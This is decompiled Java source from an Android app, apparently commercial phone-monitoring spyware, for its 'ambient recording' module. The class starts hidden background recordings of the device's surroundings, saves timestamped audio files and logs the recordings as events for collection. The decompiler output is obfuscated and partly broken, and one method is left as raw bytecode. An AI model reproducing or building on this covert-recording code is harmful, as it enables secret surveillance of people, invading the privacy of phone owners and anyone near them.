package com.vvt.temporalcontrol.a;

import android.os.Looper;
import com.vvt.base.RunningMode;
import com.vvt.events.FxAudioAmbientEvent;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxMediaType;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class a
{
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.d;
  private static final boolean d = com.vvt.ak.a.e;
  com.vvt.a.c a;
  private long e;
  private String f;
  private String g;
  private Looper h;
  private com.vvt.a.a i;
  private com.vvt.capture.a.a j;
  private com.vvt.base.a k;
  private RunningMode l;
  private d m;
  
  public a(String paramString, RunningMode paramRunningMode)
  {
    c localc = new com/vvt/temporalcontrol/a/c;
    localc.<init>(this);
    this.a = localc;
    this.g = paramString;
    this.l = paramRunningMode;
  }
  
  private void a(String paramString)
  {
    boolean bool = b;
    if (bool) {}
    Object localObject1 = new com/vvt/events/FxSystemEvent;
    ((FxSystemEvent)localObject1).<init>();
    Object localObject2 = FxEventDirection.OUT;
    ((FxSystemEvent)localObject1).setDirection((FxEventDirection)localObject2);
    long l1 = System.currentTimeMillis();
    ((FxSystemEvent)localObject1).setEventTime(l1);
    localObject2 = FxSystemEventCategories.CATEGORY_AMBIENT_RECORDING;
    ((FxSystemEvent)localObject1).setLogType((FxSystemEventCategories)localObject2);
    ((FxSystemEvent)localObject1).setMessage(paramString);
    localObject2 = new java/util/ArrayList;
    ((ArrayList)localObject2).<init>();
    ((List)localObject2).add(localObject1);
    localObject1 = this.k;
    if (localObject1 != null)
    {
      localObject1 = this.k;
      ((com.vvt.base.a)localObject1).a((List)localObject2);
    }
    bool = b;
    if (bool) {}
  }
  
  private void a(String paramString, long paramLong)
  {
    boolean bool = b;
    if (bool) {}
    long l1 = f();
    FxAudioAmbientEvent localFxAudioAmbientEvent = new com/vvt/events/FxAudioAmbientEvent;
    localFxAudioAmbientEvent.<init>();
    localFxAudioAmbientEvent.setEventId(l1);
    long l2 = this.e;
    localFxAudioAmbientEvent.setEventTime(l2);
    localFxAudioAmbientEvent.setParingId(l1);
    Object localObject1 = e();
    Object localObject2 = ".mp3";
    if (localObject1 == localObject2)
    {
      localObject1 = FxMediaType.MP3;
      localFxAudioAmbientEvent.setFormat((FxMediaType)localObject1);
    }
    for (;;)
    {
      localFxAudioAmbientEvent.setDuration(paramLong);
      localFxAudioAmbientEvent.setFilePath(paramString);
      localObject1 = b(paramString);
      localFxAudioAmbientEvent.setFileName((String)localObject1);
      localObject1 = new java/util/ArrayList;
      ((ArrayList)localObject1).<init>();
      ((List)localObject1).add(localFxAudioAmbientEvent);
      localObject2 = this.k;
      if (localObject2 != null)
      {
        localObject2 = this.k;
        ((com.vvt.base.a)localObject2).a((List)localObject1);
      }
      bool = b;
      if (bool) {}
      return;
      localObject1 = FxMediaType.AMR_NB;
      localFxAudioAmbientEvent.setFormat((FxMediaType)localObject1);
    }
  }
  
  private String b(String paramString)
  {
    String[] arrayOfString = paramString.split("/");
    int n = arrayOfString.length + -1;
    return arrayOfString[n];
  }
  
  private String e()
  {
    boolean bool = com.vvt.aa.a.d();
    Object localObject;
    if (bool)
    {
      localObject = this.l;
      RunningMode localRunningMode = RunningMode.FULL;
      if (localObject == localRunningMode)
      {
        bool = com.vvt.aa.a.b();
        if (bool)
        {
          bool = com.vvt.aa.a.g();
          if (bool) {
            localObject = ".3gp";
          }
        }
      }
    }
    for (;;)
    {
      return (String)localObject;
      localObject = ".mp3";
      continue;
      localObject = ".amr";
    }
  }
  
  /* Error */
  private long f()
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: iconst_m1
    //   3: i2l
    //   4: lstore_2
    //   5: new 191	java/io/File
    //   8: astore 4
    //   10: aload_0
    //   11: getfield 193	com/vvt/temporalcontrol/a/a:f	Ljava/lang/String;
    //   14: astore 5
    //   16: aload 4
    //   18: aload 5
    //   20: invokespecial 195	java/io/File:<init>	(Ljava/lang/String;)V
    //   23: aload 4
    //   25: invokevirtual 198	java/io/File:exists	()Z
    //   28: istore 6
    //   30: iload 6
    //   32: ifeq +191 -> 223
    //   35: new 200	java/io/FileInputStream
    //   38: astore 7
    //   40: aload 7
    //   42: aload 4
    //   44: invokespecial 203	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   47: new 205	java/io/DataInputStream
    //   50: astore 8
    //   52: aload 8
    //   54: aload 7
    //   56: invokespecial 208	java/io/DataInputStream:<init>	(Ljava/io/InputStream;)V
    //   59: aload 8
    //   61: invokevirtual 211	java/io/DataInputStream:readLong	()J
    //   64: lstore 9
    //   66: aload 8
    //   68: invokevirtual 214	java/io/DataInputStream:close	()V
    //   71: aload 7
    //   73: invokestatic 218	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   76: getstatic 33	com/vvt/temporalcontrol/a/a:removeFromPath	Z
    //   79: istore 11
    //   81: iload 11
    //   83: ifeq +3 -> 86
    //   86: lconst_1
    //   87: lstore_2
    //   88: lload 9
    //   90: lload_2
    //   91: ladd
    //   92: lstore 12
    //   94: new 222	java/io/FileOutputStream
    //   97: astore 5
    //   99: iconst_0
    //   100: istore 14
    //   102: aconst_null
    //   103: astore 15
    //   105: aload 5
    //   107: aload 4
    //   109: iconst_0
    //   110: invokespecial 225	java/io/FileOutputStream:<init>	(Ljava/io/File;Z)V
    //   113: new 227	java/io/DataOutputStream
    //   116: astore 15
    //   118: aload 15
    //   120: aload 5
    //   122: invokespecial 230	java/io/DataOutputStream:<init>	(Ljava/io/OutputStream;)V
    //   125: aload 15
    //   127: lload 12
    //   129: invokevirtual 233	java/io/DataOutputStream:writeLong	(J)V
    //   132: aload 15
    //   134: invokevirtual 234	java/io/DataOutputStream:close	()V
    //   137: aload 5
    //   139: invokestatic 236	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   142: getstatic 33	com/vvt/temporalcontrol/a/a:removeFromPath	Z
    //   145: istore 6
    //   147: iload 6
    //   149: ifeq +3 -> 152
    //   152: lload 12
    //   154: lreturn
    //   155: astore 5
    //   157: iconst_0
    //   158: istore 6
    //   160: aconst_null
    //   161: astore 5
    //   163: getstatic 40	com/vvt/temporalcontrol/a/a:d	Z
    //   166: istore 16
    //   168: iload 16
    //   170: ifeq +3 -> 173
    //   173: aload 5
    //   175: invokestatic 218	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   178: lload_2
    //   179: lstore 9
    //   181: goto -105 -> 76
    //   184: astore 5
    //   186: aconst_null
    //   187: astore 7
    //   189: getstatic 40	com/vvt/temporalcontrol/a/a:d	Z
    //   192: istore 6
    //   194: iload 6
    //   196: ifeq +3 -> 199
    //   199: aload 7
    //   201: invokestatic 218	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   204: lload_2
    //   205: lstore 9
    //   207: goto -131 -> 76
    //   210: astore 5
    //   212: aconst_null
    //   213: astore 7
    //   215: aload 7
    //   217: invokestatic 218	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   220: aload 5
    //   222: athrow
    //   223: getstatic 37	com/vvt/temporalcontrol/a/a:MyUncaughtExceptionHandler	Z
    //   226: istore 6
    //   228: iload 6
    //   230: ifeq +3 -> 233
    //   233: lload_2
    //   234: lstore 9
    //   236: goto -150 -> 86
    //   239: astore 5
    //   241: getstatic 40	com/vvt/temporalcontrol/a/a:d	Z
    //   244: istore 6
    //   246: iload 6
    //   248: ifeq +3 -> 251
    //   251: aload_1
    //   252: invokestatic 236	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   255: goto -113 -> 142
    //   258: astore 5
    //   260: iconst_0
    //   261: istore 6
    //   263: aconst_null
    //   264: astore 5
    //   266: getstatic 40	com/vvt/temporalcontrol/a/a:d	Z
    //   269: istore 14
    //   271: iload 14
    //   273: ifeq -136 -> 137
    //   276: goto -139 -> 137
    //   279: astore 5
    //   281: aload_1
    //   282: invokestatic 236	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   285: aload 5
    //   287: athrow
    //   288: astore 17
    //   290: aload 5
    //   292: astore_1
    //   293: aload 17
    //   295: astore 5
    //   297: goto -16 -> 281
    //   300: astore 15
    //   302: goto -36 -> 266
    //   305: astore 15
    //   307: aload 5
    //   309: astore_1
    //   310: goto -69 -> 241
    //   313: astore 5
    //   315: goto -100 -> 215
    //   318: astore 17
    //   320: aload 5
    //   322: astore 7
    //   324: aload 17
    //   326: astore 5
    //   328: goto -113 -> 215
    //   331: astore 5
    //   333: goto -144 -> 189
    //   336: astore 5
    //   338: aload 7
    //   340: astore 5
    //   342: goto -179 -> 163
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	345	0	this	a
    //   1	309	1	localObject1	Object
    //   4	230	2	l1	long
    //   8	100	4	localFile	File
    //   14	124	5	localObject2	Object
    //   155	1	5	localFileNotFoundException1	java.io.FileNotFoundException
    //   161	13	5	localInputStream	java.io.InputStream
    //   184	1	5	localIOException1	java.io.IOException
    //   210	11	5	localObject3	Object
    //   239	1	5	localFileNotFoundException2	java.io.FileNotFoundException
    //   258	1	5	localIOException2	java.io.IOException
    //   264	1	5	localObject4	Object
    //   279	12	5	localObject5	Object
    //   295	13	5	localObject6	Object
    //   313	8	5	localObject7	Object
    //   326	1	5	localObject8	Object
    //   331	1	5	localIOException3	java.io.IOException
    //   336	1	5	localFileNotFoundException3	java.io.FileNotFoundException
    //   340	1	5	localObject9	Object
    //   28	234	6	bool1	boolean
    //   38	301	7	localObject10	Object
    //   50	17	8	localDataInputStream	java.io.DataInputStream
    //   64	171	9	l2	long
    //   79	3	11	bool2	boolean
    //   92	61	12	l3	long
    //   100	172	14	bool3	boolean
    //   103	30	15	localDataOutputStream	java.io.DataOutputStream
    //   300	1	15	localIOException4	java.io.IOException
    //   305	1	15	localFileNotFoundException4	java.io.FileNotFoundException
    //   166	3	16	bool4	boolean
    //   288	6	17	localObject11	Object
    //   318	7	17	localObject12	Object
    // Exception table:
    //   from	to	target	type
    //   35	38	155	java/io/FileNotFoundException
    //   42	47	155	java/io/FileNotFoundException
    //   35	38	184	java/io/IOException
    //   42	47	184	java/io/IOException
    //   35	38	210	finally
    //   42	47	210	finally
    //   94	97	239	java/io/FileNotFoundException
    //   109	113	239	java/io/FileNotFoundException
    //   94	97	258	java/io/IOException
    //   109	113	258	java/io/IOException
    //   94	97	279	finally
    //   109	113	279	finally
    //   241	244	279	finally
    //   113	116	288	finally
    //   120	125	288	finally
    //   127	132	288	finally
    //   132	137	288	finally
    //   266	269	288	finally
    //   113	116	300	java/io/IOException
    //   120	125	300	java/io/IOException
    //   127	132	300	java/io/IOException
    //   132	137	300	java/io/IOException
    //   113	116	305	java/io/FileNotFoundException
    //   120	125	305	java/io/FileNotFoundException
    //   127	132	305	java/io/FileNotFoundException
    //   132	137	305	java/io/FileNotFoundException
    //   47	50	313	finally
    //   54	59	313	finally
    //   59	64	313	finally
    //   66	71	313	finally
    //   189	192	313	finally
    //   163	166	318	finally
    //   47	50	331	java/io/IOException
    //   54	59	331	java/io/IOException
    //   59	64	331	java/io/IOException
    //   66	71	331	java/io/IOException
    //   47	50	336	java/io/FileNotFoundException
    //   54	59	336	java/io/FileNotFoundException
    //   59	64	336	java/io/FileNotFoundException
    //   66	71	336	java/io/FileNotFoundException
  }
  
  public void a(long paramLong, d paramd)
  {
    boolean bool1 = b;
    if (bool1) {}
    this.m = paramd;
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    Object localObject2 = this.g;
    localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
    localObject2 = File.separator;
    localObject1 = ((StringBuilder)localObject1).append((String)localObject2).append("ar");
    localObject2 = File.separator;
    localObject1 = (String)localObject2;
    localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    ((File)localObject2).mkdirs();
    localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    localObject2 = ((StringBuilder)localObject2).append((String)localObject1).append("ambient_rec_");
    Object localObject3 = new java/text/SimpleDateFormat;
    ((SimpleDateFormat)localObject3).<init>("yyyyMMdd_HHmmss");
    Date localDate = new java/util/Date;
    localDate.<init>();
    localObject3 = ((SimpleDateFormat)localObject3).format(localDate);
    localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
    localObject3 = e();
    localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
    String str = ((StringBuilder)localObject2).toString();
    boolean bool2 = b;
    if (bool2) {}
    localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
    localObject2 = "ambient_rec_id.id";
    localObject1 = (String)localObject2;
    this.f = ((String)localObject1);
    localObject1 = this.j;
    if (localObject1 != null)
    {
      localObject1 = this.j;
      bool1 = ((com.vvt.capture.a.a)localObject1).e();
      if (bool1)
      {
        bool1 = c;
        if ((!bool1) || (paramd != null)) {
          paramd.b();
        }
        localObject1 = "Cannot start the recording because the call recording is in progress.";
        a((String)localObject1);
      }
    }
    for (;;)
    {
      return;
      localObject1 = this.i;
      if (localObject1 != null)
      {
        localObject1 = this.i;
        bool1 = ((com.vvt.a.a)localObject1).a();
        if (bool1)
        {
          bool1 = c;
          if ((!bool1) || (paramd != null)) {
            paramd.b();
          }
          localObject1 = "Cannot start the recording because an ambient recording is in progress.";
          a((String)localObject1);
        }
      }
      else
      {
        bool1 = c;
        if ((!bool1) || (paramd != null)) {
          paramd.b();
        }
        localObject1 = "Cannot start the recording because an internal error.";
        a((String)localObject1);
        continue;
      }
      long l1 = System.currentTimeMillis();
      this.e = l1;
      bool1 = b;
      if (bool1) {}
      localObject1 = new com/vvt/temporalcontrol/a/b;
      localObject3 = "AmbientRT";
      localObject2 = this;
      ((b)localObject1).<init>(this, (String)localObject3, paramLong, str);
      ((b)localObject1).start();
      bool1 = b;
      if (!bool1) {}
    }
  }
  
  public void a(com.vvt.a.a parama)
  {
    this.i = parama;
  }
  
  public void a(com.vvt.base.a parama)
  {
    this.k = parama;
  }
  
  public void a(com.vvt.capture.a.a parama)
  {
    this.j = parama;
  }
  
  public boolean a()
  {
    com.vvt.a.a locala = this.i;
    boolean bool;
    if (locala != null)
    {
      locala = this.i;
      bool = locala.a();
    }
    for (;;)
    {
      return bool;
      bool = false;
      locala = null;
    }
  }
  
  public void b()
  {
    com.vvt.a.a locala = this.i;
    if (locala != null)
    {
      locala = this.i;
      boolean bool1 = locala.a();
      if (bool1)
      {
        locala = this.i;
        boolean bool2 = true;
        locala.a(bool2);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/temporalcontrol/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */